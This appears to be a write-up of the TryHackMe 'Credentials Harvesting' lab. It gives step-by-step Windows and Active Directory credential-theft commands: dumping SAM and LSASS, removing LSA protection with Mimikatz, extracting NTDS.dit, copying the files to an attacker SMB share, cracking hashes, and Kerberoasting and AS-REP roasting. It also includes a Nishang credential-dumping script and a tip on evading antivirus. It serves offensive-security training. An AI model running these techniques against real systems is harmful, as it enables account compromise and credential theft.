# Credentials Harvesting

**Room Link:** [https://tryhackme.com/room/credharvesting](https://tryhackme.com/room/credharvesting)

## Credential Access

### Clear-text files

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path:&#x20;

```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.

**Victim(cmd)**

```
reg query HKLM /f password /t REG_SZ /s
OR
reg query HKCU /f password /t REG_SZ /s
```



**Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?**

**Victim(cmd)**

```
reg query HKLM /f password /t REG_SZ /s > results.txt
findstr "flag" results.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (5).png" alt=""><figcaption></figcaption></figure>



**Enumerate the AD environment we provided. What is the password of the victim user found in the description section?**

**Victim(cmd)**

```
powershell
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

## Local Windows Credentials

The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.&#x20;

First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the `c:\Windows\System32\config\sam` file:

**Victim(cmd)**

```
type c:\Windows\System32\config\sam
copy c:\Windows\System32\config\sam C:\Users\thm\Desktop\ 
```

<figure><img src="../../.gitbook/assets/image (9) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

## Metasploit's HashDump

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the [rapid7 ](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/)blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!



## Volume Shadow Copy Service

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:

**Victim(cmd)**

```
wmic shadowcopy call create Volume='C:\'
```

<figure><img src="../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.&#x20;

**Victim(cmd)**

```
vssadmin list shadows
```

<figure><img src="../../.gitbook/assets/image (6) (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system.

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

**Victim(cmd)**

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\thm\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\thm\Desktop\system
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).

## Registry Hives

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.

**Victim(cmd)**

```
reg save HKLM\sam C:\users\thm\Desktop\sam-reg
reg save HKLM\system C:\users\thm\Desktop\system-reg
```

Let's this time decrypt it using one of the Impacket tools: `secretsdump.py`, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.

Move both SAM and system files to the AttackBox and run the following command:

**Kali**

```
mkdir public
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 smb public/
```

**Victim(cmd)**

```
net use \\$KALI\smb
copy C:\users\thm\Desktop\sam-reg \\$KALI\smb
copy C:\users\thm\Desktop\system-reg \\$KALI\smb
copy C:\users\thm\Desktop\sam \\$KALI\smb
copy C:\users\thm\Desktop\system \\$KALI\smb
```

<figure><img src="../../.gitbook/assets/image (19) (8).png" alt=""><figcaption></figcaption></figure>

**Kali**&#x20;

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
```

<figure><img src="../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Local Security Authority Subsystem Service (LSASS)

### Graphic User Interface (GUI)

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".

![](<../../.gitbook/assets/image (7) (1).png>)

![](<../../.gitbook/assets/image (6) (1) (5).png>)

Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.

Note: if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the Protected LSASS section later in this task.

Copy the dumped process to the Mimikatz folder.

**Victim(cmd)**

```
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

### Sysinternals Suite

An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: `c:\Tools\SysinternalsSuite`&#x20;

We can specify a running process, which in our case is lsass.exe, to be dumped as follows,

**Victim(cmd)**

```
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.\


### MimiKatz

[Mimikatz ](https://github.com/gentilkiwi/mimikatz)is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.

We will be using the `Mimikatz` tool to extract the memory dump of the lsass.exe process. We have provided the necessary tools for you, and they can be found at: `c:\Tools\Mimikatz`.

Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,

**Victim(cmd)**

```
C:\Tools\Mimikatz\mimikatz.exe
```

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing `privilege::debug` command as follows,

**Victim(mimikatz)**

```
privilege::debug
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the `lsass.exe` process using `sekurlsa::logonpasswords`. If we try this on the provided VM, it will not work until we fix it in the next section.

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash.&#x20;

Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.

### Protected LSASS

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

<figure><img src="../../.gitbook/assets/image (3) (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

**Victim(mimikatz)**

```
!+
```

<figure><img src="../../.gitbook/assets/image (4) (11) (1).png" alt=""><figcaption></figcaption></figure>

Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again.\


**Victim(cmd)**

```
cd C:\Tools\Mimikatz
mimikatz.exe
```

**Victim(mimikatz)**

```
!+
```

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

\
Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

**Victim(mimikatz)**

```
!processprotect /process:lsass.exe /remove
```



<figure><img src="../../.gitbook/assets/image (11) (13).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
copy C:\Users\thm\AppData\Local\Temp\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

**Victim(cmd)**

```
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

<figure><img src="../../.gitbook/assets/image (18) (8).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

<pre><code><strong>mimikatz.exe
</strong></code></pre>

**Victim(mimikatz)**

<pre><code><strong>privilege::debug
</strong></code></pre>

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

## Windows Credential Manager

### Accessing Credential Manager

We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.

<figure><img src="../../.gitbook/assets/image (7) (10).png" alt=""><figcaption></figcaption></figure>

We will be using the Microsoft Credentials Manager `vaultcmd` utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.&#x20;

**Victim(cmd)**

```
vaultcmd /list
```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with `/listproperties`.

**Victim(cmd)**

```
VaultCmd /listproperties:"Web Credentials"
```

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,

**Victim(cmd)**

```
VaultCmd /listcreds:"Web Credentials"
```

<figure><img src="../../.gitbook/assets/image (35) (3).png" alt=""><figcaption></figcaption></figure>

### Credential Dumping

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1, which is already included in the attached VM.

**Get-WebCredentials.ps1**

```
function Get-WebCredentials
{
<#
.SYNOPSIS
Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)

.DESCRIPTION
This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script 
also needs PowerShell v3 onwards and must be run from an elevated shell.

.EXAMPLE
PS > Get-WebCredentials

.LINK
https://github.com/samratashok/nishang
#>
[CmdletBinding()] Param ()


#http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
}
```

Ensure to execute PowerShell with bypass policy to import it as a module as follows,

**Victim(cmd)**

```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

<figure><img src="../../.gitbook/assets/image (15) (9).png" alt=""><figcaption></figcaption></figure>

The output shows that we obtained the username and password for accessing the internal application.

### RunAs

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.

**Victim(cmd)**

```
cmdkey /list
```

The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user.&#x20;

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
runas /savecred /user:THM.red\thm-local cmd.exe
```

<figure><img src="../../.gitbook/assets/image (36) (4).png" alt=""><figcaption></figcaption></figure>

A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.

### Mimikatz

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.

**Victim(cmd)**

```
c:\Tools\Mimikatz\mimikatz.exe
```

**Victim(mimikatz)**

```
privilege::debug
sekurlsa::credman
```

<figure><img src="../../.gitbook/assets/image (45) (3).png" alt=""><figcaption></figcaption></figure>

## Domain Controller

This task discusses the required steps to dump Domain Controller Hashes locally and remotely.

### NTDS Domain Controller

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:

* Schema table: it contains types of objects and their relationships.
* Link table: it contains the object's attributes and their values.
* Data type: It contains users and groups.

NTDS is located in`C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the `SECURITY` file system. Therefore, we must also dump the security file containing all required files to decrypt.&#x20;

### Ntdsutil 

Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as&#x20;

* Restore deleted objects in Active Directory.
* Perform maintenance for the AD database.
* Active Directory snapshot management.
* Set Directory Services Restore Mode (DSRM) administrator passwords.

For more information about Ntdsutil, you may visit the Microsoft documentation [page](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)).

### Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller.&#x20;

To successfully dump the content of the NTDS file we need the following files:

* C:\Windows\NTDS\ntds.dit
* C:\Windows\System32\config\SYSTEM
* C:\Windows\System32\config\SECURITY

The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.

**Victim(cmd)**

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.

<figure><img src="../../.gitbook/assets/image (22) (7).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
mkdir public
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 smb public/
```

**Victim(cmd)**

```
cd C:\temp\
net use \\$KALI\smb
copy "C:\temp\Active Directory\ntds.dit" \\$KALI\smb \\$KALI\smb
copy "C:\temp\registry\SECURITY" \\$KALI\smb
copy "C:\temp\registry\SYSTEM" \\$KALI\smb
```

**Kali**

```
cd public
python3.9 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
```

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat `-m 1000` mode to crack the Windows NTLM hashes as follows:

**Kali**

```
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Local Administrator Password Solution (LAPS)

This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.

### Group Policy Preferences (GPP)

A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.

The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on [MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN). Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

### Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerate for LAPS

The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.

**Victim(cmd)**

```
dir "C:\Program Files\LAPS\CSE"
```

<figure><img src="../../.gitbook/assets/image (7) (2) (3) (2).png" alt=""><figcaption></figcaption></figure>

The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,

**Victim(cmd)**

```
powershell
Get-Command *AdmPwd*
```

<figure><img src="../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>

Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity \* argument to list all available OUs.

**Victim(cmd)**

```
Find-AdmPwdExtendedRights -Identity THMorg
```

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.

**Victim(powershell)**

```
 net groups "LAPsReader"
```

<figure><img src="../../.gitbook/assets/image (5) (3) (3).png" alt=""><figcaption></figcaption></figure>

**Victim(powershell)**

```
net user bk-admin
```

<figure><img src="../../.gitbook/assets/image (9) (2) (3) (2).png" alt=""><figcaption></figcaption></figure>

### Getting the Password

We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.

**Victim(powershell)**

```
Get-AdmPwdPassword -ComputerName creds-harvestin
```

<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script in `C:\Tool`to try it out.

## Other Attacks

n the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.

This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with [Kerberos protocol](https://en.wikipedia.org/wiki/Kerberos\_\(protocol\)) and New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.

### Kerberoasting

Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 3).

Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.

**Kali**

```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip $VICTIM THM.red/thm
Password: Passw0rd!
```

<figure><img src="../../.gitbook/assets/image (8) (1) (6).png" alt=""><figcaption></figcaption></figure>

The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.

The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.

**Kali**

```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip $VICTIM THM.red/thm -request-user svc-thm
Password: Passw0rd!
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (7).png" alt=""><figcaption></figcaption></figure>

Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using `-m 13100` mode as follows,

**Kali**

```
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (12) (1) (5).png" alt=""><figcaption></figcaption></figure>

Try replicating the steps against the attached VM by finding the SPN user and then performing the Kerberoasting attack. Once you have obtained the ticket, crack it and answer the question below.

### AS-REP Roasting

AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

<figure><img src="../../.gitbook/assets/image (11) (3) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a `users.lst` list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.

**users.lst**

```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```

We will be using the Impacket Get-NPUsers script this time as follows,

**Kali**

```
python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip $VICTIM thm.red/ -usersfile users.lst
```

<figure><img src="../../.gitbook/assets/image (4) (2) (6) (1).png" alt=""><figcaption></figcaption></figure>

We specified the IP address of the domain controller with the `-dc-ip` argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.

Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the `-format` argument.

### SMB Relay Attack

The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources.&#x20;

We suggest checking the THM[ Exploiting AD](https://tryhackme.com/room/exploitingad) room for more information about the SMB relay attack.

### LLMNR/NBNS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.

The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service. If you want to learn more about the attack, we suggest checking THM [Breaching AD](https://tryhackme.com/room/breachingad) room.

The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine.&#x20;

